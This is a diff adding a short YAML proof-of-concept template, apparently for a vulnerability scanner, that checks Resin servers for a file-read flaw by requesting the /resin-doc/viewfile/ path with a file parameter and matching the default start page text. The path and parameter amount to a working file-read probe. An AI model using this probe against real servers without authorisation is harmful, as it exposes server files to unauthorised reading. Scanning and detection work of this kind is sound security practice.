@@ -1,0 +1,10 @@
+name: poc-yaml-resin-viewfile-fileread
+rules:
+  - method: GET
+    path: /resin-doc/viewfile/?file=index.jsp
+    follow_redirects: false
+    expression: |
+      status == 200 && body.bcontains(b'This is the default start page for the Resin server')
+detail:
+  author: whynot(https://github.com/notwhy)
+  test_env: http://0day5.com/archives/1173/
